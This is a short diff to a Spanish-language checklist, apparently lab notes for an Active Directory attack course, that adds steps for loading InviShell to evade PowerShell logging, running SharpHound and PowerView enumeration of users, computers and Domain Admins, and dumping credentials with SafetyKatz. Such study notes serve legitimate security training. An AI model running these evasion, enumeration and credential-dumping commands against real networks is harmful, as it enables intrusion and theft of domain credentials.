@@ -31,12 +31,15 @@
 ### Cargar InviShell
 - [ ] `C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat`
 
-
-
-### Enumeramos usuarios del dominio
-
-
-
-
-
+### BloodHound Enumeración
 - [ ] .\SharpHound.exe -c All,GPOLocalGroup,LoggedOn --domain tech.corp
+
+### Enumeracion AD
+- [ ] `Get-DomainUser | select -ExpandProperty samaccountname`
+- [ ] `Get-DomainComputer | select -ExpandProperty dnshostname`
+- [ ] `Get-DomainGroup -Identity "Domain Admins"`
+- [ ] `Get-DomainGroupMember -Identity "Domain Admins"`
+- [ ] `Get-DomainGPO -ComputerIdentity tech-dc`
+
+### Obtener credenciales
+- [ ] `SafetyKatz.exe "privilege::debug`
